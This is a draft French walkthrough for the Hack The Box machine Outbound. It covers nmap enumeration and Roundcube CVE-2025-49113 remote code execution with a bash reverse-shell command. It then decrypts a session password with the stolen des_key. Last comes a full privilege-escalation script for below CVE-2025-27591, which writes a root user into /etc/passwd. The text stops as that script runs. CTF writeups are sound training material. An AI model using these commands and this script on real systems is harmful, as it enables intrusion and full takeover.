---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Outbound — HTB Easy Writeup & Walkthrough"
linkTitle: "Outbound"
slug: "outbound"
date: 2026-05-18T10:52:57+02:00
#lastmod: 2026-05-18T10:52:57+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Outbound"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Outbound"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Outbound> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/outbound/full_tcp_scan.txt outbound.htb
Nmap scan report for outbound.htb (10.129.x.x)
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.22 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : outbound.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour outbound.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "outbound.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/outbound/aggressive_vuln_scan_raw.txt outbound.htb
Nmap scan report for outbound.htb (10.129.x.x)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   58.80 ms 10.10.16.1
2   7.20 ms  outbound.htb (10.129.232.158)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.92 seconds

```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/outbound/cms_vuln_scan.txt outbound.htb
Nmap scan report for outbound.htb (10.129.x.x)
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-sitemap-generator: 
|   Directory structure:
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    
| http-headers: 
|   Server: nginx/1.24.0 (Ubuntu)
|   Date: Thu, 21 May 2026 08:22:03 GMT
|   Content-Type: text/html
|   Content-Length: 154
|   Connection: close
|   Location: http://mail.outbound.htb/
|   
|_  (Request type: GET)
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 36.80 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/outbound/udp_vuln_scan.txt outbound.htb
Nmap scan report for outbound.htb (10.129.x.x)
Host is up (0.016s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 7.61 seconds

```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb outbound.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.

Dans ce cas précis, le serveur retourne une réponse de taille `154` pour les chemins inexistants.  
Il est donc nécessaire de filtrer ces faux positifs avec l’option suivante :

```bash
--fs 154
```



```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : outbound.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://outbound.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/outbound.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://outbound.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -fs 154 -of json -o scans_recoweb/outbound.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/outbound.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://outbound.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -fs 154 -of json -o scans_recoweb/outbound.htb/ffuf_files.json 2>&1 | tee scans_recoweb/outbound.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===


=== Détails par outil ===

[DIRB]

[FFUF — DIRECTORIES]

[FFUF — FILES]

```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains outbound.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : outbound.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=302 size=154 words=10 (Host=qcj6rzblhl.outbound.htb)
  Baseline#2: code=302 size=154 words=10 (Host=5dbiggej78.outbound.htb)
  Baseline#3: code=302 size=154 words=10 (Host=c8k2j3wc2r.outbound.htb)
  After-redirect#1: code=200 size=5327 words=333
  After-redirect#2: code=200 size=5327 words=333
  After-redirect#3: code=200 size=5327 words=333
  VHOST (0)
    - (aucun)



=== mon-subdomains outbound.htb END ===


```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

Lorsque tu accèdes à `http://outbound.htb/`, tu es automatiquement redirigé vers `http://mail.outbound.htb/` et tu tombes sur l’interface de connexion de Roundcube Webmail.

L’objectif consiste maintenant à identifier précisément la version utilisée afin de rechercher une vulnérabilité exploitable permettant d’obtenir un accès initial.

### Identification du webmail Roundcube

Hack The Box fournit des identifiants initiaux dans la section *Machine Information*.  


![Capture d’écran de la section “Machine Information” de Hack The Box indiquant les identifiants initiaux fournis pour la machine Outbound : utilisateur tyler avec le mot de passe LhKL1o9Nm3X2](machine-info-account-tyler.png)

Tu peux donc te connecter à l’interface Roundcube avec le compte suivant :

```text
tyler : LhKL1o9Nm3X2
```



![alt="Interface de connexion Roundcube Webmail 1.6.10 accessible sur mail.outbound.htb avec formulaire d’authentification utilisateur"](webmail-login.png)



Une fois connecté avec le compte `tyler`, tu peux accéder aux informations de version via le menu **About** disponible en bas à gauche du dashboard.



![Interface Roundcube Webmail après connexion avec le compte tyler, montrant le menu About accessible en bas à gauche du dashboard afin d’obtenir les informations de version de l’application](roundcube-dasboard.png)



<img src="roundcube-about.png" alt="Fenêtre About de Roundcube Webmail 1.6.10 affichant la version installée et les plugins actifs sur outbound.htb" class="img-left-80">

La fenêtre **About** permet d’identifier précisément la version utilisée par le webmail :

```text
Roundcube Webmail 1.6.10
```



L’analyse de cette version permet d’identifier la vulnérabilité `CVE-2025-49113`, décrite comme :

```text
A critical post-authentication Remote Code Execution vulnerability
```

Cette faille permet à un utilisateur authentifié d’obtenir une exécution de code à distance sur le serveur hébergeant Roundcube.

Comme Hack The Box fournit déjà des identifiants valides, cette vulnérabilité devient immédiatement exploitable.

### Exploitation de CVE-2025-49113

Un exploit public est disponible pour `CVE-2025-49113` sur le dépôt GitHub suivant :

https://github.com/fearsoff-org/CVE-2025-49113

Tu commences donc par récupérer le PoC sur ta machine Kali :

```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113.git
cd CVE-2025-49113
```

Avant d’utiliser le PoC, tu peux commencer par afficher son aide afin de vérifier les paramètres attendus :

```bash
php CVE-2025-49113.php
```

Le script affiche alors l’usage suivant :

```bash
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Usage: php CVE-2025-49113.php <target_url> <username> <password> <command>
```

Le PoC nécessite simplement :

- l’URL cible
-  des identifiants Roundcube valides
- et la commande à exécuter sur le serveur

Tu peux alors tester l’exécution de commandes sur le serveur avec une commande système simple comme `id` :

```bash
php CVE-2025-49113.php \
  http://mail.outbound.htb \
  tyler \
  'LhKL1o9Nm3X2' \
  'id'
```

Le script semble s’exécuter correctement, mais aucun résultat de commande n’est renvoyé directement dans le terminal.

Tu testes ensuite plusieurs méthodes classiquesTu testes ensuite plusieurs méthodes classiques pour confirmer l’exécution de code à distance, notamment avec un `ping` vers ta machine Kali, mais sans succès.

Comme l’exploit ne renvoie pas directement la sortie des commandes exécutées, le plus simple consiste alors à tenter l’obtention d’un reverse shell.

### Obtention d’un reverse shell

Depuis ta machine Kali, tu prépares un listener avec `rlwrap` afin d’obtenir un shell plus confortable et plus stable qu’avec un simple listener `nc` :

```bash
rlwrap -cAr nc -lvnp 4444
```

Tu utilises ensuite le PoC pour exécuter un reverse shell Bash vers ta machine Kali :

```bash
php CVE-2025-49113.php \
  http://mail.outbound.htb \
  tyler \
  'LhKL1o9Nm3X2' \
  'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"'
```

Le listener reçoit alors une connexion entrante et tu obtiens un shell en tant que :

```bash
www-data
```

### Stabilisation du shell

Après réception du reverse shell, tu constates que `python3` n’est pas disponible sur la cible.

Comme expliqué dans la recette {{< recette "stabiliser-reverse-shell" >}}, `script` constitue une bonne alternative lorsque `python3` n’est pas disponible sur la cible.

```bash
which script
```

La commande retourne :

```bash
/usr/bin/script
```

Tu peux donc utiliser `script` pour stabiliser le reverse shell :

```bash
script -qc /bin/bash /dev/null
```



Depuis ton terminal Kali, mets le shell en arrière-plan :

```bash
Ctrl + Z
```

Puis configure correctement le TTY local :

```bash
stty raw -echo; fg
```

Et dans le reverse shell, termine avec :

```bash
export TERM=xterm
stty cols 132 rows 34
```

Tu obtiens alors un terminal interactif beaucoup plus confortable pour poursuivre l’énumération de la machine.

Si l’affichage reste incorrect après la stabilisation, tu peux lancer la commande suivante directement dans le reverse shell distant :

```bash
reset
```



### Énumération locale

Une fois le shell stabilisé, tu peux commencer l’énumération locale afin de rechercher des fichiers de configuration, des identifiants réutilisables ou d’autres informations sensibles accessibles à l’utilisateur `www-data`.

Comme souvent avec les applications PHP, les fichiers de configuration du webmail constituent une piste intéressante, car ils contiennent fréquemment les identifiants de connexion à la base de données.

Tu recherches alors les fichiers de configuration de Roundcube accessibles à l’utilisateur `www-data` dans l’arborescence du webmail :

```bash
find /var/www/html/ -type f -name "config*" 2>/dev/null
```

La commande retourne plusieurs fichiers `.dist`, mais aussi le véritable fichier de configuration utilisé par Roundcube :

```bash
/var/www/html/roundcube/config/config.inc.php
```

Tu peux alors consulter son contenu :

```bash
cat /var/www/html/roundcube/config/config.inc.php
```

Le fichier contient notamment les identifiants utilisés par Roundcube pour accéder à la base de données MySQL :

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Tu récupères également la clé utilisée par RoundcubeTu récupères également la clé `des_key` utilisée par Roundcube pour chiffrer certaines données de session :

```php
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

**Ces informations deviennent particulièrement intéressantes pour la suite de l’exploitation, car elles permettent d’accéder directement à la base de données du webmail et potentiellement de récupérer des informations sensibles liées aux utilisateurs.**

### Exploration de la base de données MariaDB de Roundcube

Le fichier `config.inc.php` indique que Roundcube utilise une base de données MySQL et contient directement les identifiants de connexion associés :

Tu peux alors tenter de te connecter à la base de données avec les identifiants récupérés dans la configuration de Roundcube :

```
mysql -u roundcube -p
```

Puis saisir le mot de passe récupéré précédemment :

```
RCDBPass2025
```

Une fois connecté, tu peux commencer par lister les bases disponibles :

```
SHOW DATABASES;
```

Résultat :

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
```

Tu sélectionnes ensuite la base utilisée par le webmail :

```
USE roundcube;
```

Puis tu listes les tables présentes :

```sql
MariaDB [roundcube]> SHOW TABLES;
SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

La table `users` permet bien d’identifier plusieurs comptes utilisés sur le webmail :

```
SELECT * FROM users;
```

Résultat :

```
+---------+----------+
| user_id | username |
+---------+----------+
|       1 | jacob    |
|       2 | mel      |
|       3 | tyler    |
+---------+----------+
```

En revanche, cette table ne contient aucun mot de passe exploitable.

La présence d’une table `session` attire particulièrement l’attention.

Dans Roundcube, la table `session` contient les informations liées aux utilisateurs connectés.

On y retrouve parfois des données sensibles comme des tokens ou des mots de passe chiffrés, ce qui en fait une piste particulièrement intéressante pour poursuivre l’exploitation.

Cette table devient donc une piste intéressante pour tenter de récupérer des informations réutilisables sur la machine.

En consultant le contenu brut de la table `session`, tu remarques rapidement que certaines données semblent encodées en Base64 plutôt que stockées directement en clair.

MariaDB dispose justement d’une fonction `FROM_BASE64()` permettant de décoder automatiquement ce type de contenu.

Tu peux donc afficher les variables de session décodées avec la requête suivante :

```
SELECT FROM_BASE64(vars) FROM session;
```

Le résultat contient alors de nombreuses informations liées aux sessions des utilisateurs connectés, notamment :

```
username|s:5:"jacob";
```

mais surtout :

```
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

Ce mot de passe semble chiffré plutôt que stocké directement en clair.

Or, le fichier `config.inc.php` contient justement une clé nommée `des_key`, utilisée par Roundcube pour protéger certaines données sensibles des utilisateurs.

Il devient donc intéressant de tenter d’utiliser cette cléIl devient alors intéressant de tenter d’utiliser cette clé pour déchiffrer le mot de passe associé à la session de l’utilisateur `jacob`.

### Déchiffrement du mot de passe de jacob

Plusieurs outils publics permettent de déchiffrer les mots de passe stockés dans les sessions Roundcube.

Ici, un outil en ligne suffit pour valider rapidement le déchiffrement du mot de passe récupéré dans la session de `jacob` :

https://www.reddit.com/r/keydecryptor/comments/1ogad81/online_roundcube_imap_password_decryptor_decoder/

https://keydecryptor.com/decryption-tools/roundcube

Tu entres les valeurs suivantes :

```bash
encrypted_password="L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key="rcmail-!24ByteDESkey*Str"
```



![Outil Roundcube Password Decoder montrant le déchiffrement du mot de passe stocké dans la session de l’utilisateur jacob à l’aide de la clé des_key récupérée dans config.inc.php sur outbound.htb](password-decrypt.png)

Après déchiffrement avec la clé `des_key`, tu obtiens le mot de passe en clair de l’utilisateur `jacob` :

```text
595mO8DmwGeD
```

Tu tentes alors de réutiliser ces identifiants sur le service SSH de la machine :

```bash
ssh jacob@outbound.htb
```

Mais l’authentification échoue.

Comme ces identifiants proviennent directement d’une session Roundcube, tu testes alors leur réutilisation sur l’interface webmail.

Cette fois, la connexion fonctionne et te donne accès à la boîte mail de l’utilisateur `jacob`.



### Lecture des mails de Jacob

L’accès à la boîte mail de `jacob` permet alors de consulter plusieurs messages potentiellement intéressants pour la suite de l’exploitation.

Un premier message intitulé **Unexpected Resource Consumption** indique que les administrateurs ont activé l’outil `below` afin de surveiller la consommation de ressources du serveur.

![Boîte mail Roundcube de l’utilisateur jacob affichant un message “Unexpected Resource Consumption” indiquant l’activation de l’outil Below pour surveiller la consommation de ressources sur outbound.htb](jacob-mail1.png)

Même si cette information n’est pas immédiatement exploitable, elle attire l’attention sur la présence potentielle de l’outil `below` sur la machine.

Un second message intitulé **Important Update** contient quant à lui un nouveau mot de passe communiqué directement à l’utilisateur `jacob`.

![Boîte mail Roundcube de l’utilisateur jacob affichant un message “Important Update” contenant un nouveau mot de passe communiqué par l’utilisateur tyler sur outbound.htb](jacob-mail2.png)

Un message intitulé **Important Update** contient un nouveau mot de passe communiqué à l’utilisateur :

```text
gY4Wr3a1evp4
```

Ce mot de passe semble plus récent que celui récupéré précédemment dans la session Roundcube.

Tu tentes alors de réutiliser ces identifiants sur le service SSH de la machine.

### user.txt

La réutilisation des identifiants récupérés dans le mail fonctionne cette fois correctement sur le service SSH :

```bash
ssh jacob@outbound.htb
```

Après authentification, tu obtiens un shell SSH interactif en tant qu’utilisateur `jacob` :

```bash
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
```

Tu peux alors accéder au fichier `user.txt`Tu peux alors lire le fichier `user.txt` et valider la prise pied sur la machine.

```bash
jacob@outbound:~$ ls -l
total 4
-rw-r----- 1 root jacob 33 May 22 13:22 user.txt

jacob@outbound:~$ cat user.txt
f922xxxxxxxxxxxxxxxxxxxxxxxx0e36
```

## Escalade de privilèges

{{< escalade-intro user="jacob" >}}

### Sudo -l
Une fois connecté en SSH avec l’utilisateur `jacob`, tu commences par vérifier les droits sudo disponibles :

```bash
sudo -l
```

Le résultat montre que `jacob` peut exécuter `/usr/bin/below` avec `sudo` sans mot de passe :

```bash
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below
        --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Cette règle est intéressante car elle autorise l’exécution de `below` avec les privilèges `root`, tout en tentant de bloquer certains modes sensibles comme `--config`, `--debug` et `-d`.

La suite de l’escalade va donc consister à analyser ce binaire et à vérifier s’il existe une faiblesse exploitable dans cette configuration sudo limitée.

### Analyse de `below`

Comme les mails de `jacob` mentionnent également l’outil `below`, cette piste mérite d’être approfondie.

Tu commences donc par rechercher tous les fichiers liés à `below` présents sur le système :

```bash
find / -iname "*below*" 2>/dev/null
```

Cette recherche révèle plusieurs éléments intéressants :

```bash
/opt/below
/usr/bin/below
/var/log/below
/etc/systemd/system/below.service
```

Le répertoire `/opt/below` attire immédiatement l’attention car il semble contenir les sources complètes du projet plutôt qu’un simple binaire installé.

Tu explores alors son contenu afin de mieux comprendre la structure de l’application :

```bash
ls -lah /opt/below
find /opt/below -maxdepth 2 -type f
```

Tu identifies rapidement plusieurs fichiers typiques d’un projet développé en Rust :

```bash
Cargo.toml
Cargo.lock
rustfmt.toml
```

> **Note**
>
> Rust est un langage de programmation moderne souvent utilisé pour développer des outils système performants et sécurisés.
>  Les projets Rust utilisent généralement un fichier `Cargo.toml` qui contient les informations principales du projet, comme son nom, sa version et ses dépendances.



Comme plusieurs composants semblent présents dans le projet, tu recherches alors tous les fichiers `Cargo.toml` :

```bash
find /opt/below -name "Cargo.toml"
```

Le résultat montre de nombreux sous-composants Rust :

```bash
/opt/below/below/render/Cargo.toml
/opt/below/below/store/Cargo.toml
/opt/below/below/view/Cargo.toml
/opt/below/below/model/Cargo.toml
...
/opt/below/below/Cargo.toml
```

Cela confirme que `/opt/below` contient les sources complètes du projet Below ainsi que plusieurs modules internes.

Le fichier intéressant est alors celui situé à la racine du composant principal :

```bash
cat /opt/below/below/Cargo.toml
```

Tu y retrouves les informations du paquet principal :

```bash
[package]
name = "below"
version = "0.8.0"
repository = "https://github.com/facebookincubator/below"
```

Cela permet d’identifier précisément la version installée et de vérifier l’existence d’éventuelles vulnérabilités connues.

### Exploit de `below`

Après avoir identifié la version `0.8.0` de Below, tu recherches alors d’éventuelles vulnérabilités publiques affectant cette version.

L’analyse des vulnérabilités connues montre que les versions de `below` inférieures à `0.8.1` sont vulnérables à la `CVE-2025-27591`, une faille d’escalade de privilèges affectant l’outil.

Une recherche sur `CVE-2025-27591` permet ensuite d’identifier un dépôt GitHub contenant un exploit public :

[obamalaolu/CVE-2025-27591](https://github.com/obamalaolu/CVE-2025-27591)

<img src="below-rce-github.png" alt="Résultat de recherche GitHub montrant le dépôt obamalaolu/CVE-2025-27591 contenant un exploit d’escalade de privilèges pour Below" class="img-left-60">

La description du dépôt indique qu’il s’agit d’une vulnérabilité d’escalade de privilèges affectant l’outil de monitoring `Below`, ce qui correspond précisément au contexte observé sur la machine.

### Exploitation de CVE-2025-27591

Tu crées ensuite un script d’exploitation directement sur la machine cible :

```bash
cd /dev/shm
nano exploit.sh
```

Et tu entres le code de l'exploit :

```bash
#!/bin/bash

# CVE-2025-27591 Exploit - Privilege Escalation via 'below'

TARGET="/etc/passwd"
LINK_PATH="/var/log/below/error_root.log"
TMP_PAYLOAD="/tmp/payload"
BACKUP="/tmp/passwd.bak"

echo "[*] CVE-2025-27591 Privilege Escalation Exploit"

# Check for sudo access to below
echo "[*] Checking sudo permissions..."
if ! sudo -l | grep -q '/usr/bin/below'; then
  echo "[!] 'below' is not available via sudo. Exiting."
  exit 1
fi

# Backup current /etc/passwd
echo "[*] Backing up /etc/passwd to $BACKUP"
cp /etc/passwd "$BACKUP"

# Generate password hash for 'haxor' user (password: hacked123)
echo "[*] Generating password hash..."
HASH=$(openssl passwd -6 'hacked123')

# Prepare malicious passwd line
echo "[*] Creating malicious passwd line..."
echo "haxor:$HASH:0:0:root:/root:/bin/bash" > "$TMP_PAYLOAD"

# Create symlink
echo "[*] Linking $LINK_PATH to $TARGET"
rm -f "$LINK_PATH"
ln -sf "$TARGET" "$LINK_PATH"

# Trigger log creation with invalid --time to force below to recreate the log
echo "[*] Triggering 'below' to write to symlinked log..."
sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1

# Overwrite passwd file via symlink
echo "[*] Injecting malicious user into /etc/passwd"
cat "$TMP_PAYLOAD" > "$LINK_PATH"

# Test access
echo "[*] Try switching to 'haxor' using password: hacked123"
su haxor
```

Après avoir sauvegardé le script, tu le rends exécutable puis tu le lances depuis `/dev/shm` :

```bash
chmod +x exploit.sh
./exploit.sh
```

L’exploit sauvegarde d’abord `/etc/passwd`, prépare une nouvelle entrée utilisateur avec les privilèges `root`, puis détourne le fichier de log `error_root.log` de `below` via un lien symbolique afin d’ajouter cette entrée dans `/etc/passwd`.



```bash
jacob@outbound:/dev/shm$ ./exploit.sh
[*] CVE-2025-27591 Privilege Escalation Exploit
